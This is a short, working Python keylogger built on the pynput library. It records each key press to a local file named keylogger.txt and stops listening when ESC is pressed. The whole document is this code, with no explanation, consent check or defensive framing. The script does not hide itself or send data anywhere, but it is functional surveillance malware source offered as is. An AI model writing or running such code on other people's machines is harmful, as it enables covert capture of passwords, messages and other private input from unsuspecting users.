
from pynput import keyboard
# File where keys will be saved
log_file = "keylogger.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f" {key} ")
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener when ESC is pressed
        return False
# Start listening to the keyboard
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
    